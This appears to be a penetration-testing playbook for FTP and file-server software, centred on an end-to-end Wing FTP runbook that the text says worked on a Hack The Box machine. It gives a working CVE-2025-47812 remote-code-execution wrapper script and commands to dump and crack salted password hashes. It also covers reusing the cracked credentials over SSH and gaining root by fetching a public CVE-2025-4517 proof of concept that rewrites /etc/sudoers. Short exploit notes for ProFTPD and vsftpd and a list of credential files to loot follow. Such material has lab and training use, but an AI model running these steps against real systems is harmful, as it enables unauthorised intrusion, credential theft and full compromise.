# Archetype: Custom FTP / File Server

**Match if you see:** Wing FTP, FileZilla Server, ProFTPD, Pure-FTPd,
vsftpd custom config, web-based FTP clients, any file-sharing service
with a web UI.

## Why these are juicy

File server software is consistently under-audited:
- Web admin panels added later, often vulnerable
- Lua / Python scripting features are exec sinks
- Anonymous access often enabled by default
- Cleartext protocols leak creds
- Server runs with file-system privileges (often root for SUID-style ops)

---

## ⚡ Wing FTP runbook (copy-paste, end-to-end)

> Confirmed working on wingdata.htb (HTB Easy, 2026-05-07). If the target
> matches the fingerprint below, this whole runbook is your fastest path.
> **Replace `TARGET` and `HOSTNAME` first.**

### Step 0 — Fingerprint
```bash
TARGET="10.X.X.X"           # ← edit
HOSTNAME="ftp.example.htb"  # ← edit, vhost from HTTP redirect
curl -s -H "Host: $HOSTNAME" http://$TARGET/login.html | grep -i "wing ftp"
# Expect: "Wing FTP Server v7.4.3"  → you are vulnerable to CVE-2025-47812
```

### Step 1 — RCE wrapper (one-shot, vhost-aware)

The exploit-db `52347.py` ships with two bugs against vhost setups:
1. follows the 302 redirect to the vhost name and fails DNS
2. raises on the 302

You don't need to fix the .py — write this 20-line wrapper instead:

```bash
cat > /tmp/wingrce.sh <<'BASH'
#!/bin/bash
# Wing FTP CVE-2025-47812 RCE wrapper. One call = one POST + one GET.
CMD="${*:-id}"
TARGET="${WFTP_TARGET:?set WFTP_TARGET}"
HOST_HDR="${WFTP_HOST:?set WFTP_HOST}"
ENC=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$CMD")
RESP=$(curl -s -i -H "Host: $HOST_HDR" -X POST "http://$TARGET/loginok.html" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: http://$TARGET" \
  -H "Referer: http://$TARGET/login.html?lang=english" \
  -H "Cookie: client_lang=english" \
  --data "username=anonymous%00]]%0dlocal+h+%3d+io.popen(\"$ENC\")%0dlocal+r+%3d+h%3aread(\"*a\")%0dh%3aclose()%0dprint(r)%0d--&password=")
COOKIE=$(echo "$RESP" | grep -i "Set-Cookie:" | sed -nE 's/.*UID=([a-f0-9]+).*/\1/p' | head -1)
[ -z "$COOKIE" ] && { echo "$RESP" | grep -iE "(alert|too many|invalid)" | head -2 >&2; exit 1; }
curl -s -H "Host: $HOST_HDR" -H "Cookie: UID=$COOKIE; client_lang=english" \
  "http://$TARGET/dir.html"
BASH
chmod +x /tmp/wingrce.sh

# Test
WFTP_TARGET="$TARGET" WFTP_HOST="$HOSTNAME" /tmp/wingrce.sh "id"
# Expect: uid=1000(wingftp) gid=1000(wingftp) ...
```

### Step 2 — Loot the user database (every time)

```bash
WFTP_TARGET="$TARGET" WFTP_HOST="$HOSTNAME" /tmp/wingrce.sh \
  "for f in /opt/wftpserver/Data/*/users/*.xml; do
     echo \"=== \$f ===\";
     grep -E 'UserName|Password' \$f;
   done"
```

### Step 3 — Discover the salt

```bash
WFTP_TARGET="$TARGET" WFTP_HOST="$HOSTNAME" /tmp/wingrce.sh \
  "grep -E 'Salt|EnablePasswordSalting' /opt/wftpserver/Data/*/settings.xml"
# Expect:
#   <EnablePasswordSalting>1</EnablePasswordSalting>
#   <SaltingString>WingFTP</SaltingString>
```

### Step 4 — Confirm the hash algorithm (mandatory — saves hours)

The Wing FTP source is on the box. **Read it instead of guessing.**

```bash
WFTP_TARGET="$TARGET" WFTP_HOST="$HOSTNAME" /tmp/wingrce.sh \
  "grep -nE 'sha2|md5|salt_string|password_md5' /opt/wftpserver/lua/ServerInterface.lua | head -15"
# Look for:
#   temppass = user.password..salt_string
#   password_md5 = sha2(temppass)
#                ^^^ algorithm = sha256(password + salt) → hashcat -m 1410
```

### Step 5 — Crack with the right hashcat mode

```bash
# Format: hash:salt
cat > /tmp/wftphashes.txt <<EOF
<hash>:WingFTP
EOF

bash scripts/timebox.sh 90 hashcat -m 1410 -a 0 /tmp/wftphashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1410 /tmp/wftphashes.txt --show
```

Mode reference (so you don't trial-and-error):
| Algorithm | Hashcat mode |
|---|---|
| `sha256(pass)` | 1400 |
| `sha256(pass.salt)` | **1410** ← Wing FTP user (per ServerInterface.lua line 449) |
| `sha256(salt.pass)` | 1420 |
| `sha256(pass.salt.pass)` | 1430 |
| `sha256(salt.pass.salt)` | 1411 |
| `md5(pass.salt)` | 10 |
| `md5(salt.pass)` | 20 |

### Step 6 — SSH cred reuse

```bash
sshpass -p '<cracked_pw>' ssh -o StrictHostKeyChecking=no <user>@$TARGET "id; cat ~/user.txt; sudo -l"
```

### Step 7 — Watch for the WingData privesc — Python tarfile sudo

If `sudo -l` shows something like:
```
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```
That script likely has `tar.extractall(filter="data")` on a path you control.
**Python <3.12.10 is vulnerable to CVE-2025-4517** (symlink+hardlink bypass).

```bash
python3 --version  # need < 3.12.10 (or any 3.8-3.13.1)
# Public PoC (download with approval, review, then run):
curl -sLO https://raw.githubusercontent.com/AzureADTrent/CVE-2025-4517-POC/refs/heads/main/CVE-2025-4517-POC.py
python3 CVE-2025-4517-POC.py
# It writes wacky NOPASSWD ALL into /etc/sudoers via the vulnerable script.
# Then: sudo /bin/bash → root.
```

---

## Common pitfalls (failure modes seen in real engagements)

### P1 — Wing FTP session lock = self-inflicted DoS
The `52347.py` exploit uses the `anonymous` user. Wing FTP caps sessions
**per account**. Hammering the exploit (especially in parallel) returns:
- *"Login failed: too many users logged to this account"* — 1-5 min recovery
- **502 Proxy Error** from Apache — Wing FTP backend hung, **wait ~3 min**

Mitigation:
- One stable reverse shell, do all enumeration through it.
- Sessions appear to clear naturally after ~5 min of no requests.
- Don't send 5 parallel exploit calls "to be safe" — you'll DoS the box.

### P2 — Stopping at "wingftp user, no sudo" — WRONG
The `wingftp` account *can't* read `/home/<user>/` on a properly-configured
box, but it **can** read `/opt/wftpserver/Data/` which has every Wing FTP
user's salted SHA256 password hash. Crack those, **the FTP web user
password is often the user's Linux SSH password too**.

### P3 — Trying SHA256 without salt
Default hashcat mode 1400 (plain SHA256) will not work on Wing FTP user
hashes. Always grep `Data/*/settings.xml` for the salt FIRST and use mode
1410 (`sha256(pass.salt)`).

### P4 — Trusting `wftp_default_ssh.key`
There is a file `/opt/wftpserver/wftp_default_ssh.key` that looks like a
prize. **It is the SFTP host key for the Wing FTP service**, not a user
SSH key. It will not authorize Linux SSH login. Don't waste time on it.

### P5 — Forgetting passive mode
Anonymous FTP behaves differently in PASV vs PORT. Test both with `ftp -n`
+ `quote USER`/`PASS` rather than `lftp` defaults.

### P6 — Not checking the web admin separately
Many FTP servers have a web admin port (5466 for Wing FTP) with separate
auth. Not used in WingData but always confirm.

---

## Other FTP servers — quick reference

### ProFTPD
- **mod_copy** abuse (CVE-2015-3306): `SITE CPFR` / `SITE CPTO` to write files
- **mod_sql injection** (older): test `quote USER admin'--`

### vsftpd
- 2.3.4 backdoor (smiley face → port 6200 shell)

### FileZilla Server
- admin port 14147 default, often weak password

### Source dive (open-source FTPs)
```bash
bash scripts/source-dive.sh proftpd/proftpd <version>
bash scripts/source-dive.sh pyftpdlib/pyftpdlib
```

---

## Post-RCE pivot targets (universal)

- All shared directories (read user files for SSH keys, .bash_history)
- User account database — `/opt/wftpserver/Data/<domain>/users/*.xml`
- Wing FTP admin database — `/opt/wftpserver/Data/_ADMINISTRATOR/admins.xml`
- TLS certs + private keys — `/opt/wftpserver/wftp_default_ssl.{crt,key}`
- Server config with admin credentials
- For ProFTPD: `/etc/proftpd/proftpd.conf` (module list = more attack surface), `/var/log/proftpd/auth.log` (leaks usernames)
- `~/.ssh/` of every user found in the FTP user DB (SSH cred reuse)
